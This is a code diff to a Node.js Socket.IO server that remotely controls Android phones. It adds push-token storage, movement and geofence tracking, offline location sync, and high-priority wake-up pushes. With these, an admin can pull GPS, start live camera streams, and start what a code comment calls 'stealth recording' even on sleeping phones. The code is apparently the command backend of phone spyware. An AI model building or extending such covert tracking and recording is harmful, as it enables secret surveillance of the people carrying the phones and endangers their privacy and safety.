@@ -18,6 +18,8 @@ const adminRoutes = require('./routes/adminRoutes');
 const Device = require('./models/Device');
 const { resolveVillageOrPara } = require('./utils/geoCoder');
 const { processDeviceLocationUpdate } = require('./utils/locationHelper');
+const { processMobilityTelemetry, processOfflineLocationsBatch } = require('./utils/mobilityEngine');
+const { sendWakeUpPush } = require('./services/firebaseService');
 
 const app = express();
 const server = http.createServer(app);
@@ -123,6 +125,7 @@ io.on('connection', (socket) => {
           ...(batteryLevel !== undefined ? { batteryLevel } : {}),
           ...(data.videoQuality ? { videoQuality: data.videoQuality } : {}),
           ...(data.cameraLens ? { cameraLens: data.cameraLens } : {}),
+          ...(data.fcmToken ? { fcmToken: data.fcmToken } : {}),
           ...(latitude ? { latitude: Number(latitude), locationUpdatedAt: now } : {}),
           ...(longitude ? { longitude: Number(longitude) } : {}),
           ...(locationName ? { locationName } : {}),
@@ -187,6 +190,7 @@ io.on('connection', (socket) => {
       if (isRecording !== undefined) device.isRecording = Boolean(isRecording);
       if (data.videoQuality) device.videoQuality = data.videoQuality;
       if (data.cameraLens) device.cameraLens = data.cameraLens;
+      if (data.fcmToken) device.fcmToken = data.fcmToken;
 
       if (latitude && longitude) {
         const locResult = processDeviceLocationUpdate(device, {
@@ -200,6 +204,18 @@ io.on('connection', (socket) => {
         }, now);
         updatedLocationEntry = locResult.updatedEntry;
         isNewLocation = locResult.isNew;
+
+        // Process Stay-Point Detection & Geofence Alerts
+        processMobilityTelemetry({
+          deviceId,
+          deviceName: device.deviceName || deviceName || 'Android',
+          latitude,
+          longitude,
+          speedKmh: data.speedKmh || data.speed || 0,
+          accuracy: data.accuracy || 10,
+          timestamp: now,
+          io,
+        }).catch(err => console.warn('Mobility telemetry processing error:', err.message));
       }
 
       await device.save();
@@ -229,11 +245,43 @@ io.on('connection', (socket) => {
     }
   });
 
+  // Offline Location Vault Batch Sync over WebSocket
+  socket.on('sync-offline-locations', async (data) => {
+    if (!data || !data.deviceId || !Array.isArray(data.locations)) return;
+    try {
+      const result = await processOfflineLocationsBatch({
+        deviceId: data.deviceId,
+        locations: data.locations,
+        io,
+      });
+      socket.emit('sync-offline-locations-ack', {
+        success: true,
+        count: result.count,
+        timestamp: Date.now(),
+      });
+      console.log(`📡 Socket sync: Processed ${result.count} offline points for ${data.deviceId}`);
+    } catch (err) {
+      console.error('Socket offline sync error:', err.message);
+      socket.emit('sync-offline-locations-ack', { success: false, error: err.message });
+    }
+  });
+
   // Admin requests real-time GPS location refresh from phone
-  socket.on('request-device-location', ({ deviceId }) => {
+  socket.on('request-device-location', async ({ deviceId }) => {
     console.log(`🛰️ Admin requested real-time GPS refresh for device: ${deviceId}`);
     io.to(`device_${deviceId}`).emit('request-device-location', { deviceId });
     io.to('devices').emit('request-device-location', { deviceId });
+
+    // High-priority FCM wake-up in case phone is in deep sleep / Doze mode
+    try {
+      const dbDev = await Device.findOne({ deviceId });
+      if (dbDev && dbDev.fcmToken) {
+        console.log(`📡 Sending FCM wake-up for GPS refresh: ${deviceId}`);
+        sendWakeUpPush(dbDev.fcmToken, 'request-location', { deviceId });
+      }
+    } catch (e) {
+      console.warn('Error sending FCM wake-up for location:', e.message);
+    }
   });
 
   // Admin registration from React dashboard
@@ -249,37 +297,27 @@ io.on('connection', (socket) => {
     socket.join(`watch_${deviceId}`);
 
     let dev = connectedDevices.get(deviceId);
-    const room = io.sockets.adapter.rooms.get(`device_${deviceId}`);
-    const isRoomActive = room && room.size > 0;
-
-    // Check if device is active in DB (seen in last 5 minutes)
-    let isDbActive = false;
-    try {
-      const dbDev = await Device.findOne({ deviceId });
-      if (dbDev && dbDev.lastSeen) {
-        const diffMs = Date.now() - new Date(dbDev.lastSeen).getTime();
-        isDbActive = diffMs < 300000; // 5 minutes
-      }
-    } catch (e) {
-      // ignore
-    }
-
-    if (!dev && !isRoomActive && !isDbActive) {
-      console.warn(`Device ${deviceId} is offline (no socket, room empty, DB inactive).`);
-      socket.emit('stream-error', { deviceId, error: 'Device is offline or unreachable' });
-      return;
-    }
-
     if (dev) {
       dev.isStreaming = true;
     }
 
-    // Broadcast to target device room
+    // Broadcast to target device socket room
     io.to(`device_${deviceId}`).emit('start-live-stream', {
       adminSocketId: socket.id,
       deviceId,
       camera,
     });
+
+    // Send High-Priority FCM Wake-Up Push so sleeping phones wake up instantly
+    try {
+      const dbDev = await Device.findOne({ deviceId });
+      if (dbDev && dbDev.fcmToken) {
+        console.log(`📡 Sending FCM instant wake-up for live stream: ${deviceId}`);
+        sendWakeUpPush(dbDev.fcmToken, 'start-live-stream', { deviceId, camera });
+      }
+    } catch (e) {
+      console.warn('Error sending FCM wake-up for live stream:', e.message);
+    }
   });
 
   // Phone sends a compressed video frame
@@ -337,6 +375,17 @@ io.on('connection', (socket) => {
     } catch (e) {}
     io.to(`device_${deviceId}`).emit('start-remote-recording', { deviceId, camera: lens });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: true, camera: lens });
+
+    // High-priority FCM wake-up to trigger recording even when device is sleeping
+    try {
+      const dbDev = await Device.findOne({ deviceId });
+      if (dbDev && dbDev.fcmToken) {
+        console.log(`📡 Sending FCM wake-up for remote recording: ${deviceId}`);
+        sendWakeUpPush(dbDev.fcmToken, 'record-video', { deviceId, camera: lens });
+      }
+    } catch (e) {
+      console.warn('Error sending FCM wake-up for recording:', e.message);
+    }
   });
 
   // Admin remotely stops stealth recording on phone
@@ -347,6 +396,14 @@ io.on('connection', (socket) => {
     } catch (e) {}
     io.to(`device_${deviceId}`).emit('stop-remote-recording', { deviceId });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: false });
+
+    // FCM push to ensure recording stops even if socket is in reconnect loop
+    try {
+      const dbDev = await Device.findOne({ deviceId });
+      if (dbDev && dbDev.fcmToken) {
+        sendWakeUpPush(dbDev.fcmToken, 'stop-recording', { deviceId });
+      }
+    } catch (e) {}
   });
 
   // Device notifies recording started or stopped (via hardware buttons or app UI)
